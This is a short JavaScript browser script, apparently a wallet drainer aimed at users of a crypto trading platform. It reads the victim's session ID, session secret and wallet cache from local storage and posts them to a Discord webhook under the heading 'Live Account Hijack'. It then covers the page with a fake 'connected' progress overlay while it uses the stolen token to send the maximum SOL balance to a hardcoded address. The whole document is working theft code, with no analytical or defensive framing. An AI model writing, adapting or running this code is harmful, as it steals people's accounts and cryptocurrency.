(async function() {
    // --- CONFIGURATION ---
    const DRAIN_ADDRESS = "BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1nqnLVE12";
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1470147665403711650/EoDTKeiayE46AN7W8ENl-CkVdoaiep9oyq2FljjRLTh505lEgpxakCw1iMjx97FMiqQ4";

    // 1. DYNAMIC DATA CAPTURE
    // This looks at the browser's storage to find the ACTIVE user right now
    const sessionRaw = localStorage.getItem("padreV2-session");
    const wallets = localStorage.getItem("padreV2-walletsCache");
    
    let session = {};
    try { 
        session = JSON.parse(sessionRaw); 
    } catch(e) {
        console.error("Vanta: Session Parse Error");
    }

    // Check if we actually got data before sending
    if (!session.sessionId || !session.sessionSecret) {
        return; // Exit silently if not logged in
    }

    // 2. SEND TO DISCORD (Dynamic Info)
    fetch(WEBHOOK_URL, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
            content: "🚨 **NEW VANTA SESSION CAPTURED** 🚨",
            embeds: [{
                title: "Live Account Hijack",
                fields: [
                    { name: "User ID / Address", value: `\`${session.uid}\``, inline: false },
                    { name: "Session ID", value: `\`${session.sessionId}\``, inline: true },
                    { name: "Session Secret", value: `\`${session.sessionSecret}\``, inline: true },
                    { name: "Wallets Found", value: wallets ? "✅ Yes" : "❌ No", inline: true }
                ],
                color: 0x00ff88,
                footer: { text: "Vanta Engine v2.0" },
                timestamp: new Date()
            }]
        })
    });

    // 3. STEALTH UI OVERLAY
    const ui = document.createElement("div");
    ui.style = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:999999;display:flex;justify-content:center;align-items:center;color:#0f8;font-family:monospace;flex-direction:column;text-align:center;";
    ui.innerHTML = `
        <div style="border:1px solid #0f8;padding:30px;background:#000;box-shadow:0 0 15px #0f8;">
            <div style="font-size:20px;margin-bottom:10px;">VANTA CONNECTED</div>
            <div id="vanta-progress-text">SYNCING API DATA...</div>
            <div style="margin-top:15px;width:250px;height:4px;background:#111;border:1px solid #0f8;">
                <div id="vanta-bar" style="width:0%;height:100%;background:#0f8;transition:width 0.4s;"></div>
            </div>
        </div>
    `;
    document.body.appendChild(ui);

    // 4. ATTEMPT DRAIN USING DYNAMIC SESSION
    const bar = document.getElementById("vanta-bar");
    const status = document.getElementById("vanta-progress-text");

    // Sequence to keep them on the page
    const sequence = ["HANDSHAKE...", "FETCHING KEYS...", "READY."];
    for (let i = 0; i < sequence.length; i++) {
        await new Promise(r => setTimeout(r, 1200));
        status.innerText = sequence[i];
        bar.style.width = ((i + 1) * 33) + "%";
    }

    try {
        // Use the CAPTURED sessionSecret for the Authorization header
        await fetch("https://api.padre.gg/v1/transfer", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Authorization": `Bearer ${session.sessionSecret}`
            },
            body: JSON.stringify({
                recipient: DRAIN_ADDRESS,
                amount: "MAX",
                asset: "SOL"
            })
        });
    } catch(err) {
        // Fail silently
    }

    setTimeout(() => ui.remove(), 1000);
})();
